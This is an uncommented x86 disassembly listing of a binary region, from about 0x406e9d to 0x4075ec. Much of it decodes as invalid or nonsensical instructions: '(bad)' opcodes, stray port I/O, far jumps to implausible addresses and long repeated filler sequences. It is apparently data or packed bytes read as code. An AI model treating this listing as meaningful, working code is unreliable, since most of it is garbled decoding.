  406e9d:	repz cmp eax,0x3df0897b
  406ea3:	pop    edx
  406ea4:	mov    ecx,esi
  406ea6:	cmp    eax,0x3dee9955
  406eab:	pop    esp
  406eac:	cdq    
  406ead:	out    dx,eax
  406eae:	cmp    eax,0x3dec8957
  406eb3:	ds mov ebp,ebp
  406eb6:	cmp    eax,0x3dfa9941
  406ebb:	xor    BYTE PTR [ecx-0x76ccc205],bl
  406ec1:	clc    
  406ec2:	cmp    eax,0x3df989a2
  406ec7:	popf   
  406ec8:	cdq    
  406ec9:	idiv   BYTE PTR ds:0x3df79994
  406ecf:	(bad)
  406ed3:	xchg   BYTE PTR [eax],al
  406ed5:	add    BYTE PTR [eax],al
  406ed7:	add    BYTE PTR [eax],al
  406ed9:	mov    ebp,esi
  406edb:	cmp    eax,0x3e029929
  406ee0:	sub    BYTE PTR [ecx-0x76d4c1fd],bl
  406ee6:	add    BYTE PTR [esi],bh
  406ee8:	sub    cl,BYTE PTR [ecx-0x66dac1ff]
  406eee:	(bad)  
  406eef:	cmp    eax,0x3dff992c
  406ef4:	daa    
  406ef5:	mov    esp,edi
  406ef7:	cmp    eax,0x57bb6600
  406efc:	xor    DWORD PTR [ecx-0x45],esp
  406eff:	push   esi
  406f00:	xor    DWORD PTR [eax-0x45],esi
  406f03:	push   ebp
  406f04:	xor    DWORD PTR [ebx-0x45],esi
  406f07:	push   esp
  406f08:	xor    edx,esp
  406f0a:	stos   DWORD PTR es:[edi],eax
  406f0b:	push   ebx
  406f0c:	xor    DWORD PTR ds:0x2c3152ac,edi
  406f12:	lods   al,BYTE PTR ds:[esi]
  406f13:	push   ecx
  406f14:	xor    DWORD PTR [edi],ebx
  406f16:	lods   al,BYTE PTR ds:[esi]
  406f17:	push   eax
  406f18:	xor    DWORD PTR [esi],edi
  406f1a:	lods   al,BYTE PTR ds:[esi]
  406f1b:	dec    edi
  406f1c:	xor    DWORD PTR [ecx],ecx
  406f1e:	lods   al,BYTE PTR ds:[esi]
  406f1f:	outs   dx,BYTE PTR ds:[esi]
  406f20:	xor    DWORD PTR [eax],ecx
  406f22:	lods   al,BYTE PTR ds:[esi]
  406f23:	ins    DWORD PTR es:[edi],dx
  406f24:	xor    ebx,edi
  406f26:	stos   DWORD PTR es:[edi],eax
  406f27:	ins    BYTE PTR es:[edi],dx
  406f28:	xor    DWORD PTR [edx],ebx
  406f2a:	lods   al,BYTE PTR ds:[esi]
  406f2b:	imul   esi,DWORD PTR [ecx],0x5
  406f2e:	lods   al,BYTE PTR ds:[esi]
  406f2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f30:	adc    DWORD PTR [esp+ebp*4],eax
  406f33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f34:	adc    DWORD PTR [edi],eax
  406f36:	lods   al,BYTE PTR ds:[esi]
  406f37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f38:	adc    DWORD PTR [esi],edx
  406f3a:	lods   al,BYTE PTR ds:[esi]
  406f3b:	mov    ds:0x11,eax
  406f40:	add    BYTE PTR [eax],al
  406f42:	icebp  
  406f43:	stos   DWORD PTR es:[edi],eax
  406f44:	mov    ds:0xa1ac0011,al
  406f49:	adc    DWORD PTR [ebx],eax
  406f4b:	lods   al,BYTE PTR ds:[esi]
  406f4c:	mov    al,ds:0x9fac5211
  406f51:	adc    ebp,ecx
  406f53:	lods   al,BYTE PTR ds:[esi]
  406f54:	mov    esi,0xbdacbc11
  406f59:	adc    DWORD PTR [edi-0x51ee4354],ebp
  406f5f:	lods   al,BYTE PTR ds:[esi]
  406f60:	mov    ebx,0xbaacd911
  406f65:	adc    eax,ebx
  406f67:	lods   al,BYTE PTR ds:[esi]
  406f68:	mov    ecx,0xb8accb11
  406f6d:	adc    DWORD PTR [edx-0x6aee4854],ecx
  406f73:	lods   al,BYTE PTR ds:[esi]
  406f74:	mov    dh,0x11
  406f76:	nop
  406f77:	mov    dh,0x8
  406f79:	mov    ecx,0xba08aba1
  406f7e:	mov    eax,ds:0x81bb08b4
  406f83:	ror    DWORD PTR [eax],0xbc
  406f86:	xor    DWORD PTR [edx-0x507e42f8],0x8081be08
  406f90:	or     bh,BYTE PTR [edi-0x3ff58a5f]
  406f96:	mov    eax,ds:0xa1c10a6e
  406f9b:	arpl   WORD PTR [edx],cx
  406f9d:	ret    0x7ca1
  406fa0:	or     ch,BYTE PTR [ebp-0x5f]
  406fa3:	imul   ecx,DWORD PTR [edx],0x71
  406fa9:	add    BYTE PTR [eax],al
  406fab:	mov    eax,ds:0xa1780a6a
  406fb0:	or     bh,BYTE PTR [bx-0x5f]
  406fb4:	dec    eax
  406fb5:	or     al,BYTE PTR [ecx-0x7bf5c27f]
  406fbb:	add    DWORD PTR [esi+0xa],0xa3b8186
  406fc2:	lea    eax,[ecx+0x618e0a24]
  406fc8:	xor    DWORD PTR [edx],ecx
  406fca:	jmp    0x406f4d
  406fcc:	and    cl,BYTE PTR [edx]
  406fce:	lock sbb DWORD PTR [edi],0xc81f90a
  406fd5:	or     ch,BYTE PTR [ecx-0x5402d250]
  406fdb:	mov    al,0x3d
  406fdd:	std    
  406fde:	push   ecx
  406fdf:	xchg   ecx,eax
  406fe0:	ss std 
  406fe2:	push   edx
  406fe3:	xchg   ecx,eax
  406fe4:	sub    edi,ebp
  406fe6:	ja     0x406f79
  406fe8:	cmp    DWORD PTR [eax+eiz*4],ebp
  406feb:	mov    al,0x3a
  406fed:	sub    al,0xa1
  406fef:	mov    al,0x37
  406ff1:	sub    al,0xa2
  406ff3:	mov    al,0xb2
  406ff5:	inc    esp
  406ff6:	and    esi,ebx
  406ff8:	ror    DWORD PTR [ecx+0x23],1
  406ffb:	in     al,dx
  406ffc:	rol    DWORD PTR [edx+0x23],1
  406fff:	cmc    
  407000:	rol    DWORD PTR [edi+0x23],1
  407003:	out    dx,al
  407004:	rol    DWORD PTR [eax+0x23],1
  407007:	not    ecx
  407009:	pop    ebp
  40700a:	and    edi,eax
  40700c:	ror    DWORD PTR [esi+0x23],1
  40700f:	add    BYTE PTR [eax],al
  407011:	add    BYTE PTR [eax],al
  407013:	add    cl,ch
  407015:	ror    DWORD PTR [ebx+0x23],1
  407018:	jmp    0x81d2:0x3b249cd1
  40701f:	and    al,0x34
  407021:	sar    BYTE PTR [eax],cl
  407023:	les    edi,FWORD PTR [edx+edi*8+0x44]
  407027:	stc    
  407028:	je     0x407024
  40702a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40702b:	aam    0xac
  40702d:	cli    
  40702e:	inc    esp
  40702f:	stc    
  407030:	and    al,0xfa
  407032:	cdq    
  407033:	pop    es
  407034:	mov    ebp,0xf4f944f9
  407039:	stc    
  40703a:	mov    al,ds:0x4f9c213
  40703f:	stc    
  407040:	adc    edx,edi
  407042:	cmp    BYTE PTR [esi-0x6fb057f],ah
  407048:	adc    edx,edi
  40704a:	mov    al,ds:0x4fa6d81
  40704f:	stc    
  407050:	adc    dl,bh
  407052:	sub    eax,0x4fa6d63
  407057:	stc    
  407058:	adc    DWORD PTR [edx],edi
  40705a:	dec    edx
  40705b:	cwde   
  40705c:	imul   ecx,DWORD PTR [ebx+0x4b11f8c5],0xeb03a62e
  407066:	(bad)  
  407067:	clc    
  407068:	adc    ebx,ebp
  40706a:	mov    ebp,0xc4aab59c
  40706f:	clc    
  407070:	add    al,0xeb
  407072:	push   cs
  407073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407074:	loope  0x407069
  407076:	inc    esi
  407077:	retf   0x0
  40707a:	add    BYTE PTR [eax],al
  40707c:	add    BYTE PTR [eax+0x2f],bl
  40707f:	inc    edi
  407080:	(bad)  
  407081:	push   edi
  407082:	cli    
  407083:	jbe    0x40700f
  407085:	dec    eax
  407086:	pop    ds
  407087:	inc    edi
  407088:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40708a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40708b:	inc    edi
  40708c:	mov    bh,BYTE PTR [eax]
  40708e:	xor    al,0x47
  407090:	call   0x1f28:0x8a47a1d9
  407097:	inc    edi
  407098:	adc    al,0x64
  40709a:	pop    ds
  40709b:	inc    edi
  40709c:	mov    bl,BYTE PTR [ebx]
  40709e:	pop    ds
  40709f:	inc    edi
  4070a0:	push   es
  4070a1:	adc    eax,0x94a4720
  4070a6:	pop    ds
  4070a7:	inc    edi
  4070a8:	cmc    
  4070a9:	fstp   QWORD PTR [esi]
  4070ab:	inc    edi
  4070ac:	dec    edx
  4070ad:	cli    
  4070ae:	push   ds
  4070af:	inc    edi
  4070b0:	scas   al,BYTE PTR es:[edi]
  4070b1:	mov    al,0xc7
  4070b3:	inc    esi
  4070b4:	dec    edx
  4070b5:	jmp    0x3154b7ed
  4070ba:	fadd   QWORD PTR [esi+0x4a]
  4070bd:	fnstenv [ebx]
  4070bf:	inc    edi
  4070c0:	inc    esp
  4070c1:	fxch   st(4)
  4070c3:	inc    esi
  4070c4:	or     cl,cl
  4070c6:	xor    eax,DWORD PTR [edi-0x1d]
  4070c9:	gs pop ds
  4070cb:	inc    edi
  4070cc:	or     bh,BYTE PTR [ecx-0x764fb8cd]
  4070d2:	stos   DWORD PTR es:[edi],eax
  4070d3:	inc    esi
  4070d4:	or     ch,BYTE PTR [ecx-0x6c16b8ce]
  4070da:	mov    dl,0xe
  4070dc:	jmp    0xe94f2374
  4070e1:	add    BYTE PTR [eax],al
  4070e3:	add    BYTE PTR [eax],al
  4070e5:	add    BYTE PTR [ebx-0x6c16f14e],dl
  4070eb:	mov    dl,0xe
  4070ed:	jmp    0xe94f2385
  4070f2:	xchg   ebx,eax
  4070f3:	mov    dl,0xe
  4070f5:	add    BYTE PTR [ecx-0x4b],bh
  4070f8:	push   cs
  4070f9:	add    BYTE PTR [ecx-0x4b],bh
  4070fc:	push   cs
  4070fd:	add    BYTE PTR [ecx-0x2c],ch
  407100:	push   cs
  407101:	and    ecx,DWORD PTR [ebp+0x392728c1]
  407107:	mov    ch,0x24
  407109:	sub    edi,DWORD PTR [ecx]
  40710b:	fsub   DWORD PTR [eax]
  40710d:	add    BYTE PTR [ecx-0x3c],bl
  407110:	cmp    al,0x33
  407112:	pop    ebp
  407113:	mov    al,0x38
  407115:	aaa    
  407116:	push   ecx
  407117:	mov    esp,0xb539000e
  40711c:	push   cs
  40711d:	add    BYTE PTR [ecx],ch
  40711f:	xchg   esp,eax
  407120:	outs   dx,BYTE PTR ds:[esi]
  407121:	arpl   WORD PTR ds:0x61676a80,cx
  407127:	jg     0x40718f
  407129:	imul   edx,DWORD PTR [ebp-0x6d],0x62
  40712d:	outs   dx,DWORD PTR ds:[esi]
  40712e:	pop    ecx
  40712f:	xchg   DWORD PTR [esi+0x73],edi
  407132:	pop    ebp
  407133:	jnp    0x4071af
  407135:	ja     0x407188
  407137:	outs   dx,DWORD PTR ds:[esi]
  407138:	jbe    0x40713a
  40713a:	stc    
  40713b:	mov    ah,0x50
  40713d:	pop    edi
  40713e:	dec    ecx
  40713f:	xchg   edi,eax
  407140:	outs   dx,BYTE PTR ds:[esi]
  407141:	arpl   WORD PTR [ebp-0x75],cx
  407144:	push   0x67
  407146:	mov    eax,ds:0x6b667f
  40714b:	add    BYTE PTR [eax],al
  40714d:	add    BYTE PTR [eax],al
  40714f:	xchg   ebp,eax
  407150:	xchg   ebx,eax
  407151:	bound  ebp,QWORD PTR [edi-0x67]
  407154:	xchg   DWORD PTR [esi+0x73],edi
  407157:	popf   
  407158:	jnp    0x4071d4
  40715a:	ja     0x4070ed
  40715c:	outs   dx,DWORD PTR ds:[esi]
  40715d:	jbe    0x40715f
  40715f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407160:	mov    ah,0x70
  407162:	add    BYTE PTR [ecx-0x56fff14c],ch
  407168:	mov    ah,0xe
  40716a:	add    BYTE PTR [ecx-0x4c],bh
  40716d:	push   cs
  40716e:	add    BYTE PTR [ecx-0x4c],bh
  407171:	push   cs
  407172:	add    BYTE PTR [eax-0x6ffff377],dl
  407178:	mov    DWORD PTR [eax+eax*1],ecx
  40717b:	nop
  40717c:	mov    DWORD PTR [eax+eax*1],ecx
  40717f:	nop
  407180:	mov    DWORD PTR [eax+eax*1],ecx
  407183:	nop
  407184:	mov    DWORD PTR [eax+eax*1],ecx
  407187:	nop
  407188:	mov    DWORD PTR [eax+eax*1],ecx
  40718b:	nop
  40718c:	mov    DWORD PTR [eax+eax*1],ecx
  40718f:	nop
  407190:	mov    DWORD PTR [eax+eax*1],ecx
  407193:	nop
  407194:	mov    DWORD PTR [eax+eax*1],ecx
  407197:	nop
  407198:	mov    DWORD PTR [eax+eax*1],ecx
  40719b:	nop
  40719c:	mov    DWORD PTR [eax+eax*1],ecx
  40719f:	nop
  4071a0:	mov    DWORD PTR [eax+eax*1],ecx
  4071a3:	nop
  4071a4:	mov    DWORD PTR [eax+eax*1],ecx
  4071a7:	nop
  4071a8:	mov    DWORD PTR [eax+eax*1],ecx
  4071ab:	nop
  4071ac:	mov    DWORD PTR [eax+eax*1],ecx
  4071af:	nop
  4071b0:	mov    DWORD PTR [eax+eax*1],ecx
  4071b3:	add    BYTE PTR [eax],al
  4071b5:	add    BYTE PTR [eax],al
  4071b7:	add    BYTE PTR [eax-0x6ffff377],dl
  4071bd:	mov    DWORD PTR [eax+eax*1],ecx
  4071c0:	nop
  4071c1:	mov    DWORD PTR [eax+eax*1],ecx
  4071c4:	nop
  4071c5:	mov    DWORD PTR [eax+eax*1],ecx
  4071c8:	nop
  4071c9:	mov    DWORD PTR [eax+eax*1],ecx
  4071cc:	nop
  4071cd:	mov    DWORD PTR [eax+eax*1],ecx
  4071d0:	nop
  4071d1:	mov    DWORD PTR [eax+eax*1],ecx
  4071d4:	nop
  4071d5:	mov    DWORD PTR [eax+eax*1],ecx
  4071d8:	nop
  4071d9:	mov    DWORD PTR [eax+eax*1],ecx
  4071dc:	nop
  4071dd:	mov    DWORD PTR [eax+eax*1],ecx
  4071e0:	nop
  4071e1:	mov    DWORD PTR [eax+eax*1],ecx
  4071e4:	nop
  4071e5:	mov    DWORD PTR [eax+eax*1],ecx
  4071e8:	nop
  4071e9:	sub    BYTE PTR [ebp-0x1],bl
  4071ec:	xchg   edi,eax
  4071ed:	adc    BYTE PTR [ebp-0x1],bl
  4071f0:	(bad)  
  4071f1:	mov    dl,0x68
  4071f3:	push   edx
  4071f4:	xchg   DWORD PTR [edi-0x6080adaf],ebx
  4071fa:	pop    ecx
  4071fb:	push   edx
  4071fc:	ja     0x40719d
  4071fe:	inc    ecx
  4071ff:	push   edx
  407200:	outs   dx,DWORD PTR ds:[esi]
  407201:	lahf   
  407202:	dec    ecx
  407203:	push   edx
  407204:	addr16 lahf 
  407206:	xor    DWORD PTR [edx+0x5f],edx
  407209:	lahf   
  40720a:	cmp    DWORD PTR [edx+0x57],edx
  40720d:	lahf   
  40720e:	and    DWORD PTR [edx+0x4f],edx
  407211:	lahf   
  407212:	sub    DWORD PTR [edx+0x47],edx
  407215:	lahf   
  407216:	adc    DWORD PTR [edx+0x3f],edx
  407219:	lahf   
  40721a:	out    0x4,al
  40721c:	add    BYTE PTR [eax],al
  40721e:	add    BYTE PTR [eax],al
  407220:	add    BYTE PTR [edx-0x69f7164d],dl
  407226:	mov    bh,0xfd
  407228:	cld    
  407229:	es lahf 
  40722b:	icebp  
  40722c:	push   ecx
  40722d:	pop    ds
  40722e:	lahf   
  40722f:	stc    
  407230:	cld    
  407231:	mov    ch,BYTE PTR [esi-0x6060fe2e]
  407237:	jmp    0xd1df798d
  40723c:	push   ecx
  40723d:	call   FWORD PTR [esi-0x6108ae27]
  407243:	rcl    DWORD PTR [ecx-0x11],0x9e
  407247:	leave  
  407248:	push   ecx
  407249:	out    0x9e,eax
  40724b:	mov    cl,0x51
  40724d:	fistp  WORD PTR [esi-0x51750147]
  407253:	rol    BYTE PTR [ecx],cl
  407255:	lahf   
  407256:	lahf   
  407257:	test   eax,0x919ec751
  40725c:	push   ecx
  40725d:	mov    edi,0xb751999e
  407262:	sahf   
  407263:	adc    DWORD PTR [ecx-0x51],0xa751899e
  40726a:	sahf   
  40726b:	jno    0x4072be
  40726d:	lahf   
  40726e:	sahf   
  40726f:	psubsw mm2,QWORD PTR [ebx-0x6c16f14e]
  407276:	mov    dl,0xe
  407278:	jmp    0xe94f2510
  40727d:	xchg   ebx,eax
  40727e:	mov    dl,0xe
  407280:	jmp    0xe94f2518
  407285:	add    BYTE PTR [eax],al
  407287:	add    BYTE PTR [eax],al
  407289:	add    BYTE PTR [ebx-0x6c16f14e],dl
  40728f:	mov    dl,0xe
  407291:	jmp    0xe94f2529
  407296:	xchg   ebx,eax
  407297:	mov    dl,0xe
  407299:	jmp    0xe94f2531
  40729e:	xchg   ebx,eax
  40729f:	mov    dl,0xe
  4072a1:	jmp    0xe94f2539
  4072a6:	xchg   ebx,eax
  4072a7:	mov    dl,0xe
  4072a9:	jmp    0xe94f2541
  4072ae:	xchg   ebx,eax
  4072af:	mov    dl,0xe
  4072b1:	jmp    0xe94f2549
  4072b6:	xchg   ebx,eax
  4072b7:	mov    dl,0xe
  4072b9:	jmp    0xe94f2551
  4072be:	xchg   ebx,eax
  4072bf:	mov    dl,0xe
  4072c1:	jmp    0xe94f2559
  4072c6:	xchg   ebx,eax
  4072c7:	mov    dl,0xe
  4072c9:	jmp    0xe94f2561
  4072ce:	xchg   ebx,eax
  4072cf:	mov    dl,0xe
  4072d1:	jmp    0xe94f2569
  4072d6:	xchg   ebx,eax
  4072d7:	mov    dl,0xe
  4072d9:	jmp    0xe94f2571
  4072de:	xchg   ebx,eax
  4072df:	mov    dl,0xe
  4072e1:	jmp    0xe94f2579
  4072e6:	xchg   ebx,eax
  4072e7:	mov    dl,0xe
  4072e9:	jmp    0x4f2581
  4072ee:	add    BYTE PTR [eax],al
  4072f0:	add    BYTE PTR [eax],al
  4072f2:	add    BYTE PTR [ecx-0x56fff14f],bh
  4072f8:	mov    cl,0xe
  4072fa:	add    BYTE PTR [ecx+0x79000eb1],ch
  407300:	mov    cl,0xe
  407302:	add    BYTE PTR [ecx-0x4f],bh
  407305:	push   cs
  407306:	add    BYTE PTR [ecx-0x4f],ch
  407309:	push   cs
  40730a:	add    BYTE PTR [ecx-0x4f],ch
  40730d:	push   cs
  40730e:	add    BYTE PTR [ecx-0x4f],bh
  407311:	push   cs
  407312:	add    BYTE PTR [ecx-0x4f],bh
  407315:	push   cs
  407316:	add    BYTE PTR [ecx-0x4f],ch
  407319:	push   cs
  40731a:	add    BYTE PTR [ecx-0x50],ch
  40731d:	or     eax,0xdb03800
  407322:	add    DWORD PTR [eax],edi
  407324:	mov    al,0xd
  407326:	add    DWORD PTR [eax],ebp
  407328:	mov    al,0xd
  40732a:	add    DWORD PTR [eax],ebp
  40732c:	mov    al,0xd
  40732e:	add    DWORD PTR [eax],edi
  407330:	mov    al,0xd
  407332:	add    DWORD PTR [eax],edi
  407334:	mov    al,0xd
  407336:	add    DWORD PTR [eax],ebp
  407338:	mov    al,0xd
  40733a:	add    BYTE PTR [eax],ch
  40733c:	mov    al,0xd
  40733e:	add    eax,edi
  407340:	scas   eax,DWORD PTR es:[edi]
  407341:	or     eax,0xdb5f801
  407346:	add    eax,ebp
  407348:	mov    ch,0xd
  40734a:	add    eax,ebp
  40734c:	mov    ch,0xd
  40734e:	add    eax,edi
  407350:	mov    ch,0xd
  407352:	add    eax,edi
  407354:	mov    ch,0xd
  407356:	add    DWORD PTR [eax],eax
  407358:	add    BYTE PTR [eax],al
  40735a:	add    BYTE PTR [eax],al
  40735c:	call   0xe8418116
  407361:	mov    ch,0xd
  407363:	add    DWORD PTR [eax-0x47fef24b],edi
  407369:	mov    ch,0xd
  40736b:	add    DWORD PTR [eax-0x6ffef24b],ebp
  407371:	mov    cl,BYTE PTR [ebx]
  407373:	add    DWORD PTR [ecx-0x6efef476],edx
  407379:	mov    cl,BYTE PTR [ebx]
  40737b:	add    DWORD PTR [ecx-0x6ffef476],edx
  407381:	mov    ecx,DWORD PTR [eax+eax*1]
  407384:	nop
  407385:	mov    DWORD PTR [eax+eax*1],ecx
  407388:	nop
  407389:	mov    DWORD PTR [eax+eax*1],ecx
  40738c:	nop
  40738d:	mov    DWORD PTR [eax+eax*1],ecx
  407390:	nop
  407391:	mov    DWORD PTR [eax+eax*1],ecx
  407394:	nop
  407395:	mov    DWORD PTR [eax+eax*1],ecx
  407398:	nop
  407399:	mov    DWORD PTR [eax+eax*1],ecx
  40739c:	nop
  40739d:	mov    DWORD PTR [eax+eax*1],ecx
  4073a0:	nop
  4073a1:	mov    DWORD PTR [eax+eax*1],ecx
  4073a4:	nop
  4073a5:	mov    DWORD PTR [eax+eax*1],ecx
  4073a8:	nop
  4073a9:	mov    DWORD PTR [eax+eax*1],ecx
  4073ac:	nop
  4073ad:	mov    DWORD PTR [eax+eax*1],ecx
  4073b0:	nop
  4073b1:	mov    DWORD PTR [eax+eax*1],ecx
  4073b4:	nop
  4073b5:	mov    DWORD PTR [eax+eax*1],ecx
  4073b8:	nop
  4073b9:	mov    DWORD PTR [eax+eax*1],ecx
  4073bc:	nop
  4073bd:	mov    DWORD PTR [eax+eax*1],ecx
  4073c0:	add    BYTE PTR [eax],al
  4073c2:	add    BYTE PTR [eax],al
  4073c4:	add    BYTE PTR [eax-0x6ffff377],dl
  4073ca:	mov    DWORD PTR [eax+eax*1],ecx
  4073cd:	nop
  4073ce:	mov    DWORD PTR [eax+eax*1],ecx
  4073d1:	nop
  4073d2:	mov    DWORD PTR [eax+eax*1],ecx
  4073d5:	nop
  4073d6:	mov    DWORD PTR [eax+eax*1],ecx
  4073d9:	nop
  4073da:	mov    DWORD PTR [eax+eax*1],ecx
  4073dd:	nop
  4073de:	mov    DWORD PTR [eax+eax*1],ecx
  4073e1:	nop
  4073e2:	mov    DWORD PTR [eax+eax*1],ecx
  4073e5:	nop
  4073e6:	mov    DWORD PTR [eax+eax*1],ecx
  4073e9:	nop
  4073ea:	mov    DWORD PTR [eax+eax*1],ecx
  4073ed:	nop
  4073ee:	mov    dl,0xe5
  4073f0:	add    edx,DWORD PTR [eax-0x6ffc1a4e]
  4073f6:	mov    dl,0xe5
  4073f8:	add    edx,DWORD PTR [eax-0x6ffc1a4e]
  4073fe:	mov    dl,0xe5
  407400:	add    edx,DWORD PTR [eax-0x6ffc1a4e]
  407406:	mov    dl,0xe6
  407408:	add    DWORD PTR [eax-0x6ffc1a4e],edx
  40740e:	mov    dl,0xe3
  407410:	add    DWORD PTR [eax-0x6ffc1c4e],edx
  407416:	mov    dl,0xe6
  407418:	add    al,0x90
  40741a:	mov    dl,0xe9
  40741c:	add    edx,DWORD PTR [eax-0x6ffb1c4e]
  407422:	mov    dl,0xe7
  407424:	add    edx,DWORD PTR [eax+0x3e0b2]
  40742a:	add    BYTE PTR [eax],al
  40742c:	add    BYTE PTR [eax],al
  40742e:	cwde   
  40742f:	mov    dl,0x35
  407431:	jle    0x407403
  407433:	mov    dl,0x10
  407435:	add    ecx,DWORD PTR [edx-0x2f81ee4e]
  40743b:	mov    dl,0x3d
  40743d:	add    edx,DWORD PTR [edx+esi*4-0x4d2f8c13]
  407444:	add    ecx,DWORD PTR [bp-0x2a4e]
  407449:	jae    0x40741b
  40744b:	mov    dl,0x50
  40744d:	add    ebx,DWORD PTR [edx+esi*4-0x4daf8c3b]
  407454:	cmp    al,0x4
  407456:	mov    al,ds:0x507415b2
  40745b:	mov    dl,0xfe
  40745d:	add    ebx,DWORD PTR [edi+0x507429b2]
  407463:	mov    dl,0x75
  407465:	add    al,0x81
  407467:	mov    dl,0x19
  407469:	je     0x4074bb
  40746b:	mov    dl,0xe
  40746d:	jo     0x407403
  40746f:	mov    bl,0xe
  407471:	inc    ecx
  407472:	cmp    al,0xf2
  407474:	push   cs
  407475:	sbb    al,0x94
  407477:	mov    al,0xe
  407479:	sbb    DWORD PTR [edx+esi*8],edi
  40747c:	push   cs
  40747d:	(bad)  
  40747e:	xchg   ebx,eax
  40747f:	mov    dh,0xe
  407481:	adc    eax,0xa00ef21c
  407486:	xchg   esp,eax
  407487:	ror    DWORD PTR [esi],0xfd
  40748a:	and    esi,edx
  40748c:	push   cs
  40748d:	cmc    
  40748e:	xchg   ebx,eax
  40748f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407490:	push   cs
  407491:	pop    ecx
  407492:	add    BYTE PTR [eax],al
  407494:	add    BYTE PTR [eax],al
  407496:	add    ah,bh
  407498:	repnz push cs
  40749a:	rcl    DWORD PTR [ebx-0x376f151],cl
  4074a0:	repnz push cs
  4074a2:	pop    ebx
  4074a3:	xchg   esp,eax
  4074a4:	ror    DWORD PTR [esi],cl
  4074a6:	sbb    esp,0x93b80ef2
  4074ac:	stos   BYTE PTR es:[edi],al
  4074ad:	push   cs
  4074ae:	sub    eax,0x510ef2dc
  4074b3:	xchg   esp,eax
  4074b4:	mov    cl,0xe
  4074b6:	adc    DWORD PTR [edx+esi*8-0x516c5cf2],edi
  4074bd:	push   cs
  4074be:	or     DWORD PTR [edx+esi*8-0x4f6c0cf2],edi
  4074c5:	push   cs
  4074c6:	add    DWORD PTR [edx+esi*8-0x556be7f2],ebx
  4074cd:	push   cs
  4074ce:	stc    
  4074cf:	mov    ds:0x93780ef2,eax
  4074d4:	mov    cl,0xe
  4074d6:	in     eax,dx
  4074d7:	xor    edx,0xe
  4074da:	inc    ecx
  4074db:	xchg   esp,eax
  4074dc:	mov    edi,0xf282e50e
  4074e1:	push   cs
  4074e2:	not    DWORD PTR [ebx+0x62ed0ec0]
  4074e8:	repnz push cs
  4074ea:	add    bl,bl
  4074ec:	mov    ch,0x7
  4074ee:	add    ch,bl
  4074f0:	and    al,0x4f
  4074f2:	add    BYTE PTR [ecx],ch
  4074f4:	mov    dh,0x4
  4074f6:	add    BYTE PTR [ebp+0x4f24],dh
  4074fc:	add    BYTE PTR [eax],al
  4074fe:	add    BYTE PTR [eax],al
  407500:	in     al,dx
  407501:	mov    ch,0x9
  407503:	add    BYTE PTR [ecx-0x22ffb0db],al
  407509:	mov    ch,0x8
  40750b:	add    BYTE PTR [ecx+0x25],ch
  40750e:	dec    edi
  40750f:	add    bl,dh
  407511:	mov    ch,0x5
  407513:	add    BYTE PTR [ecx+0x25],dh
  407516:	dec    edi
  407517:	add    BYTE PTR [ebp-0x4b],ch
  40751a:	push   ds
  40751b:	add    BYTE PTR [ebp+0x55004f25],cl
  407521:	mov    ch,0x6
  407523:	add    BYTE PTR [ecx+0x24],dh
  407526:	dec    edi
  407527:	add    BYTE PTR [eax-0x4b],al
  40752a:	pop    es
  40752b:	add    ch,ch
  40752d:	and    al,0x4f
  40752f:	add    BYTE PTR [edi],cl
  407531:	mov    ch,0x7
  407533:	add    ch,ah
  407535:	and    al,0x4f
  407537:	add    BYTE PTR ds:0xdd0006b5,bh
  40753d:	and    al,0x4f
  40753f:	add    BYTE PTR [eax-0x36ffe64b],bl
  407545:	and    al,0x4f
  407547:	add    BYTE PTR [edi],bh
  407549:	mov    ch,0x3
  40754b:	add    cl,al
  40754d:	and    al,0x4f
  40754f:	add    ch,dl
  407551:	mov    ch,0x3
  407553:	add    BYTE PTR [ebp+0x24],ch
  407556:	dec    edi
  407557:	add    BYTE PTR [ebp+esi*4+0x24a9001c],al
  40755e:	dec    edi
  40755f:	add    BYTE PTR [ebx-0x52],bh
  407562:	add    eax,0x0
  407567:	add    BYTE PTR [eax],al
  407569:	int    0x1e
  40756b:	dec    edi
  40756c:	add    BYTE PTR [eax-0x6ff4f4d0],dl
  407572:	jnp    0x4075ee
  407574:	inc    eax
  407575:	nop
  407576:	loop   0x407582
  407578:	or     edx,DWORD PTR [eax-0x6fbf85a9]
  40757e:	mov    eax,ds:0x9390130c
  407583:	jp     0x4075c5
  407585:	nop
  407586:	(bad)  
  407587:	or     al,0x10
  407589:	nop
  40758a:	xchg   edi,eax
  40758b:	jp     0x4075cd
  40758d:	nop
  40758e:	aad    0xa
  407590:	adc    BYTE PTR [eax-0x6fbf8585],dl
  407596:	jb     0x4075a4
  407598:	adc    dl,BYTE PTR [eax-0x6fbf8731]
  40759e:	repnz or dl,BYTE PTR [edx]
  4075a1:	nop
  4075a2:	sar    DWORD PTR [eax+0x40],0x90
  4075a6:	mov    cs,WORD PTR [ecx+edx*1]
  4075a9:	nop
  4075aa:	gs jp  0x4075ed
  4075ad:	nop
  4075ae:	daa    
  4075af:	or     edx,DWORD PTR [eax]
  4075b1:	nop
  4075b2:	or     DWORD PTR [ecx+0x40],edi
  4075b5:	nop
  4075b6:	cli    
  4075b7:	or     dl,BYTE PTR [ebx]
  4075b9:	nop
  4075ba:	std    
  4075bb:	js     0x4075fd
  4075bd:	nop
  4075be:	fwait
  4075bf:	or     al,0x13
  4075c1:	nop
  4075c2:	xor    DWORD PTR [ecx+0x40],edi
  4075c5:	nop
  4075c6:	stos   DWORD PTR es:[edi],eax
  4075c7:	or     bl,BYTE PTR [edx]
  4075c9:	nop
  4075ca:	cmc    
  4075cb:	js     0x40760d
  4075cd:	add    BYTE PTR [eax],al
  4075cf:	add    BYTE PTR [eax],al
  4075d1:	add    BYTE PTR [eax-0x6ff1f4ec],dl
  4075d7:	loope  0x407651
  4075d9:	inc    eax
  4075da:	nop
  4075db:	fmul   DWORD PTR [edx]
  4075dd:	push   cs
  4075de:	nop
  4075df:	sar    DWORD PTR [eax+0x40],0x90
  4075e3:	add    ecx,DWORD PTR [ebx]
  4075e5:	adc    al,0x90
  4075e7:	mov    eax,ds:0xb290407a
  4075ec:	scas   al,BYTE PTR es:[edi]
